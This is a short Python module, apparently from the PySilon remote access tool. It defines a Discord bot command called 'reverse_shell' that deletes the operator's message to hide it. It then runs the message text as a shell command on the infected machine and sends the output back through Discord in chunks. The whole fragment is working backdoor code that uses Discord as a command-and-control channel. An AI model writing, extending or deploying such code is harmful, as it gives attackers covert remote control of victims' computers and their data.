import resources.modules.misc as pysilon_misc
from PIL import ImageGrab
import subprocess
import asyncio
import os

@client.command(name="cmd")
async def reverse_shell(ctx, cmd_command=None):
    await ctx.message.delete()
    if cmd_command != None:
        cmd_output = pysilon_misc.force_decode(subprocess.run(ctx.message.content[5:], capture_output= True, shell= True).stdout).strip()
        message_buffer = ''
        await ctx.send('```Executed command: ' + ctx.message.content[5:] + '\nstdout:```');
        for line in range(1, len(cmd_output.split('\n'))):
            if len(message_buffer) + len(cmd_output.split('\n')[line]) > 1950:
                await ctx.send('```' + message_buffer + '```');
                message_buffer = cmd_output.split('\n')[line]
            else:
                message_buffer += cmd_output.split('\n')[line] + '\n'
        await ctx.send('```' + message_buffer + '```');
        await ctx.send('```End of command stdout```');
    else:
        return await ctx.send("```No command was given.```")